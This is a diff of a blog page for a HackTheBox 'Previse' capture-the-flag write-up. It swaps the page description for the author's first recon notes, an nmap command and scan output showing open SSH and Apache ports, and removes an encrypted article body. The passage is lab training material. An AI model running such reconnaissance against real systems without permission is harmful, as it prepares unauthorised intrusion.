@@ -4,8 +4,8 @@
 <title>Previse - HackTheBox machine :: RoundofThree</title>
 <meta content="text/html; charset=utf-8" http-equiv="content-type"/>
 <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-<meta content=" Rank: easy  These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.
-" name="description"/>
+<meta content="Foothold 1- Nmap discovers tcp 22 and 80 ports.
+# Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb Nmap scan report for previse.htb (10.10.11.104) Host is up (0.068s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2." name="description"/>
 <meta content="[hacking kaggle blog resume hackthebox machine-learning reverse-engineering infosec]" name="keywords"/>
 <meta content="noodp" name="robots"/>
 <link href="/labs/previse/" rel="canonical"/>
@@ -18,8 +18,8 @@
 <meta content="en" property="og:locale"/>
 <meta content="article" property="og:type"/>
 <meta content="Previse - HackTheBox machine" property="og:title"/>
-<meta content=" Rank: easy  These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.
-" property="og:description"/>
+<meta content="Foothold 1- Nmap discovers tcp 22 and 80 ports.
+# Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb Nmap scan report for previse.htb (10.10.11.104) Host is up (0.068s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2." property="og:description"/>
 <meta content="/labs/previse/" property="og:url"/>
 <meta content="RoundofThree" property="og:site_name"/>
 <meta content="/favicon.png" property="og:image"/>
@@ -76,20 +76,171 @@
     
   </span>
 <div class="post-content"><div>
-<ul>
-<li>Rank: easy</li>
-</ul>
-<p>These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.</p>
-<div class="hugo-encryptor-container">
-<div class="hugo-encryptor-prompt">
-<p>Part of this article is encrypted with password:</p>
-</div>
-<div class="hugo-encryptor-form">
-<input class="hugo-encryptor-input" placeholder="Please input the password"/>
-<input class="hugo-encryptor-button" onclick="_click_handler(this)" type="button" value="Click to verify"/>
-</div>
-<div class="hugo-encryptor-cipher-text" style="display: none;">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